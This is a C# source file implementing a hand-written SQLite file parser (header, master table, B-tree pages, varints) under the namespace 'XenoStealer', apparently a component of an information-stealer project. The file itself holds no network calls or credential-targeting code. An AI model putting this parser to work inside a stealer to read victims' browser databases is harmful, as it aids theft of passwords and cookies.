using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace XenoStealer
{
    public class SqlLite3Parser
    {
        private struct record_header_field
        {
            public long size;
            public long type;
        }
        
        private struct sqlite_master_entry
        {
            public long row_id;
            public string item_type;
            public string item_name;
            public long root_num;
            public string sql_statement;
        }
        
        private struct table_entry
        {
            public long row_id;
            public string[] content;
        }
        
        
        private byte[] db_bytes;
        private int encoding;
        private string[] field_names;
        private sqlite_master_entry[] master_table_entries;
        private ushort page_size;
        private byte[] SQLDataTypeSize = new byte[]
        {
        0,
        1,
        2,
        3,
        4,
        6,
        8,
        8,
        0,
        0
        };
        
        private table_entry[] table_entries;
        

        public SqlLite3Parser(byte[] db_bytes)
        {
            this.db_bytes = db_bytes;
            if (Encoding.Default.GetString(db_bytes, 0, 15) != "SQLite format 3" || db_bytes[52] != 0)
            {
                throw new Exception("Not supported!");
            }
        
            page_size = convertXToUshort(16);
            encoding = convertXToInt(56);
            if (encoding == 0)
            {
                encoding = 1;
            }
            ReadMasterTable(100);
        }
        
     
        
        public static T[] CopyArray<T>(T[] sourceArray, int newSize)
        {
            if (sourceArray == null)
            {
                return new T[newSize];
            }
        
            T[] newArray = new T[newSize];
            Array.Copy(sourceArray, newArray, Math.Min(sourceArray.Length, newSize));
            return newArray;
        }
        
        private void ReadMasterTable(ulong Offset)
        {
            if (db_bytes[(int)Offset] == 13)
            {
                ushort num = (ushort)(convertXToUshort((int)Offset + 3) - 1);
                int num2 = 0;
                if (master_table_entries != null)
                {
                    num2 = master_table_entries.Length;
                    master_table_entries = CopyArray(master_table_entries, master_table_entries.Length + (int)num + 1);
                }
                else
                {
                    master_table_entries = new sqlite_master_entry[(int)(num + 1)];
                }
                int num3 = (int)num;
                for (int i = 0; i <= num3; i++)
                {
        
        
                    ulong num4 = convertXbyteToNumber((int)Offset + 8 + (i * 2), 2);
                    if (Offset != 100)
                    {
                        num4 += Offset;
                    }
                    int num5 = GVL((int)num4);
                    CVL((int)num4, num5);
                    int num6 = GVL(num5 + 1);
                    master_table_entries[num2 + i].row_id = CVL(num5 + 1, num6);
                    num4 = Convert.ToUInt64(num6 + 1);
                    num5 = GVL((int)num4);
                    num6 = num5;
                    long value = CVL((int)num4, num5);
                    long[] array = new long[5];
                    int num7 = 0;
                    do
                    {
                        num5 = num6 + 1;
                        num6 = GVL(num5);
                        array[num7] = CVL(num5, num6);
                        if (array[num7] > 9L)
                        {
                            if (IsOdd(array[num7]))
                            {
                                array[num7] = (long)Math.Round((array[num7] - 13L) / 2.0);
                            }
                            else
                            {
                                array[num7] = (long)Math.Round((array[num7] - 12L) / 2.0);
                            }
                        }
                        else
                        {
                            array[num7] = SQLDataTypeSize[(int)array[num7]];
                        }
                        num7++;
                    }
                    while (num7 <= 4);
        
        
                    if (encoding == 1)
                    {
                        master_table_entries[num2 + i].item_type = Encoding.Default.GetString(db_bytes, (int)((long)num4 + value), (int)array[0]);
                    }
                    else if (encoding == 2)
                    {
                        master_table_entries[num2 + i].item_type = Encoding.Unicode.GetString(db_bytes, (int)((long)num4 + value), (int)array[0]);
                    }
                    else if (encoding == 3)
                    {
                        master_table_entries[num2 + i].item_type = Encoding.BigEndianUnicode.GetString(db_bytes, (int)((long)num4 + value), (int)array[0]);
                    }
                    if (encoding == 1)
                    {
                        master_table_entries[num2 + i].item_name = Encoding.Default.GetString(db_bytes, (int)((long)num4 + value + array[0]), (int)array[1]);
                    }
                    else if (encoding == 2)
                    {
                        master_table_entries[num2 + i].item_name = Encoding.Unicode.GetString(db_bytes, (int)((long)num4 + value + array[0]), (int)array[1]);
                    }
                    else if (encoding == 3)
                    {
                        master_table_entries[num2 + i].item_name = Encoding.BigEndianUnicode.GetString(db_bytes, (int)((long)num4 + value + array[0]), (int)array[1]);
                    }
                    master_table_entries[num2 + i].root_num = (long)convertXbyteToNumber((int)((long)num4 + value + array[0] + array[1] + array[2]), (int)array[3]);
                    if (encoding == 1)
                    {
                        master_table_entries[num2 + i].sql_statement = Encoding.Default.GetString(db_bytes, (int)((long)num4 + value + array[0] + array[1] + array[2] + array[3]), (int)array[4]);
                    }
                    else if (encoding == 2)
                    {
                        master_table_entries[num2 + i].sql_statement = Encoding.Unicode.GetString(db_bytes, (int)((long)num4 + value + array[0] + array[1] + array[2] + array[3]), (int)array[4]);
                    }
                    else if (encoding == 3)
                    {
                        master_table_entries[num2 + i].sql_statement = Encoding.BigEndianUnicode.GetString(db_bytes, (int)((long)num4 + value + array[0] + array[1] + array[2] + array[3]), (int)array[4]);
                    }
                }
                return;
            }
            if (db_bytes[(int)Offset] == 5)
            {
        
                int num8 = convertXToUshort((int)Offset + 3) - 1;
                for (int j = 0; j <= num8; j++)
                {
                    ushort num9 = convertXToUshort((int)Offset + 12 + (j * 2));
                    if (Offset == 100)
                    {
                        ReadMasterTable((ulong)((convertXToInt(num9) - 1) * page_size));
                    }
                    else
                    {
                        ReadMasterTable((ulong)((convertXToInt((int)(Offset + num9)) - 1) * page_size));
                    }
                }
                ReadMasterTable((ulong)((convertXToInt((int)(Offset + 8)) - 1) * page_size));
            }
        }
        
        
        private ulong convertXbyteToNumber(int startIndex, int Size)
        {
            if (Size > 8 || Size == 0)
            {
                return 0;
            }
            ulong byte_toInt = 0;
            int checkSize = Size - 1;
            for (int i = 0; i <= checkSize; i++)
            {
                byte_toInt = byte_toInt << 8 | db_bytes[startIndex + i];
            }
            return byte_toInt;
        }
        
        private ushort convertXToUshort(int startIndex)
        {
            return (ushort)convertXbyteToNumber(startIndex, 2);
        }
        
        private int convertXToInt(int startIndex)
        {
            return (int)convertXbyteToNumber(startIndex, 4);
        }
        
        private long CVL(int startIndex, int endIndex)
        {
            endIndex++;
            byte[] array = new byte[8];
            int num = endIndex - startIndex;
            bool flag = false;
            if (num == 0 | num > 9)
            {
                return 0L;
            }
            if (num == 1)
            {
                array[0] = (byte)(db_bytes[startIndex] & 127);
                return BitConverter.ToInt64(array, 0);
            }
            if (num == 9)
            {
                flag = true;
            }
            int num2 = 1;
            int num3 = 7;
            int num4 = 0;
            if (flag)
            {
                array[0] = db_bytes[endIndex - 1];
                endIndex--;
                num4 = 1;
            }
            for (int i = endIndex - 1; i >= startIndex; i += -1)
            {
                if (i - 1 >= startIndex)
                {
                    array[num4] = (byte)(((int)((byte)(db_bytes[i] >> (num2 - 1 & 7))) & 255 >> num2) | (int)((byte)(db_bytes[i - 1] << (num3 & 7))));
                    num2++;
                    num4++;
                    num3--;
                }
                else if (!flag)
                {
                    array[num4] = (byte)((int)((byte)(db_bytes[i] >> (num2 - 1 & 7))) & 255 >> num2);
                }
            }
            return BitConverter.ToInt64(array, 0);
        }
        
        public int GetRowCount()
        {
            return table_entries.Length;
        }
        
        public string[] GetTableNames()
        {
            string[] array = null;
            int num = 0;
            int num2 = master_table_entries.Length - 1;
            for (int i = 0; i <= num2; i++)
            {
                if (master_table_entries[i].item_type == "table")
                {
                    array = CopyArray(array, num + 1);
                    array[num] = master_table_entries[i].item_name;
                    num++;
                }
            }
            return array;
        }
        
        public string GetValue(int row_num, int field)
        {
            if (row_num >= table_entries.Length)
            {
                return null;
            }
            if (field >= table_entries[row_num].content.Length)
            {
                return null;
            }
            return table_entries[row_num].content[field];
        }
        
        public string GetValue(int row_num, string field)
        {
            int num = -1;
            int num2 = field_names.Length - 1;
            for (int i = 0; i <= num2; i++)
            {
                if (field_names[i].ToLower().CompareTo(field.ToLower()) == 0)
                {
                    num = i;
                    break;
                }
            }
            if (num == -1)
            {
                return null;
            }
            return GetValue(row_num, num);
        }
        
        private int GVL(int startIndex)
        {
            if (startIndex > db_bytes.Length)
            {
                return 0;
            }
            int num = startIndex + 8;
            for (int i = startIndex; i <= num; i++)
            {
                if (i > db_bytes.Length - 1)
                {
                    return 0;
                }
                if ((db_bytes[i] & 128) != 128)
                {
                    return i;
                }
            }
            return startIndex + 8;
        }
        
        private bool IsOdd(long value)
        {
            return (value & 1L) == 1L;
        }
        
        public bool ReadTable(string TableName)
        {
            int num = -1;
            int num2 = master_table_entries.Length - 1;
            for (int i = 0; i <= num2; i++)
            {
                if (master_table_entries[i].item_name.ToLower().CompareTo(TableName.ToLower()) == 0)
                {
                    num = i;
                    break;
                }
            }
            if (num == -1)
            {
                return false;
            }
            string[] array = master_table_entries[num].sql_statement.Substring(master_table_entries[num].sql_statement.IndexOf("(") + 1).Split(new char[]
            {
            ','
            });
            int num3 = array.Length - 1;
            for (int j = 0; j <= num3; j++)
            {
                array[j] = array[j].TrimStart(new char[0]);
                int num4 = array[j].IndexOf(" ");
                if (num4 > 0)
                {
                    array[j] = array[j].Substring(0, num4);
                }
                if (array[j].IndexOf("UNIQUE") == 0)
                {
                    break;
                }
                field_names = CopyArray(field_names, j + 1);
                field_names[j] = array[j];
            }
            return ReadTableFromOffset((ulong)((master_table_entries[num].root_num - 1L) * (long)((ulong)page_size)));
        }
        
        private bool ReadTableFromOffset(ulong Offset)
        {
            if (db_bytes[(int)Offset] == 13)
            {
                int num = convertXToUshort((int)Offset + 3) - 1;
                int num2 = 0;
                if (table_entries != null)
                {
                    num2 = table_entries.Length;
                    table_entries = CopyArray(table_entries, table_entries.Length + num + 1);
                }
                else
                {
                    table_entries = new table_entry[num + 1];
                }
                for (int i = 0; i <= num; i++)
                {
                    record_header_field[] array = null;
                    ulong num4 = convertXToUshort((int)Offset + 8 + i * 2);
                    if (Offset >= 100)
                    {
                        num4 += Offset;
                    }
                    int num5 = GVL((int)num4);
                    CVL((int)num4, num5);
                    int num6 = GVL(num5 + 1);
                    table_entries[num2 + i].row_id = CVL(num5 + 1, num6);
                    num4 = (ulong)(num6 + 1);
                    num5 = GVL((int)num4);
                    num6 = num5;
                    long num7 = CVL((int)num4, num5);
                    long num8 = (long)num4 - num5 + 1;
                    int num9 = 0;
                    while (num8 < num7)
                    {
                        CopyArray(table_entries, table_entries.Length + num + 1);
                        array = CopyArray(array, num9 + 1);
                        num5 = num6 + 1;
                        num6 = GVL(num5);
                        array[num9].type = CVL(num5, num6);
                        if (array[num9].type > 9)
                        {
                            if (IsOdd(array[num9].type))
                            {
                                array[num9].size = (long)Math.Round((array[num9].type - 13) / 2.0);
                            }
                            else
                            {
                                array[num9].size = (long)Math.Round((array[num9].type - 12) / 2.0);
                            }
                        }
                        else
                        {
                            array[num9].size = (long)SQLDataTypeSize[array[num9].type];
                        }
                        num8 = num8 + (num6 - num5) + 1;
                        num9++;
                    }
                    table_entries[num2 + i].content = new string[array.Length];
                    int num10 = 0;
                    for (int j = 0; j < array.Length; j++)
                    {
                        if (array[j].type > 9)
                        {
                            if (!IsOdd(array[j].type))
                            {
                                if (encoding == 1)
                                {
                                    table_entries[num2 + i].content[j] = Encoding.Default.GetString(db_bytes, (int)num4 + (int)num7 + num10, (int)array[j].size);
                                }
                                else if (encoding == 2)
                                {
                                    table_entries[num2 + i].content[j] = Encoding.Unicode.GetString(db_bytes, (int)num4 + (int)num7 + num10, (int)array[j].size);
                                }
                                else if (encoding == 3)
                                {
                                    table_entries[num2 + i].content[j] = Encoding.BigEndianUnicode.GetString(db_bytes, (int)num4 + (int)num7 + num10, (int)array[j].size);
                                }
                            }
                            else
                            {
                                table_entries[num2 + i].content[j] = Encoding.Default.GetString(db_bytes, (int)num4 + (int)num7 + num10, (int)array[j].size);
                            }
                        }
                        else
                        {
                            table_entries[num2 + i].content[j] = convertXbyteToNumber((int)num4 + (int)num7 + num10, (int)array[j].size).ToString();
                        }
                        num10 += (int)array[j].size;
                    }
                }
            }
            else if (db_bytes[(int)Offset] == 5)
            {
                int num12 = convertXToUshort((int)Offset + 3) - 1;
                for (int k = 0; k <= num12; k++)
                {
                    ushort num13 = convertXToUshort((int)Offset + 12 + k * 2);
                    ReadTableFromOffset((ulong)(convertXToInt((int)(Offset + num13)) - 1) * page_size);
                }
                ReadTableFromOffset((ulong)(convertXToInt((int)Offset + 8) - 1) * page_size);
            }
            return true;
        }

    }
}
